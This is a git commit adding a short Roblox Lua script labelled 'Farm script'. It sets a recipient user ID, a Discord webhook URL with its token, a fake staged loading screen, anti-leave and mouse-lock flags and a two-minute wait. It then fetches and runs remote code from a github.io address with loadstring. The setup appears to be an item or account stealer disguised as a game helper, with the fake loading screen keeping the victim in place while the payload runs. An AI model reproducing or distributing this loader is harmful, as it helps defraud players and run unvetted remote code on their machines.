0d50121fd7b033841613d1a63b3686c75f851d0c
Frigerr <96822019+Frigerr@users.noreply.github.com>
2023-05-01 11:42:21 +0300

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,21 @@
+_G.UserID = 2383755050
+
+_G.Webhook = "https://discord.com/api/webhooks/1097567032712646779/QkVuuNj1BN6yKMY_6Zi7uW01iDU_snZ_T400qTSBhfdjPr32668FsW6snWqRrSYfxdYP"
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = true
+
+_G.ScriptName = "Farm script"
+
+_G.FirstText = "Script Preparing"
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 120
+
+loadstring(game:HttpGet("https://rizz69.github.io/Script.lua", true))()
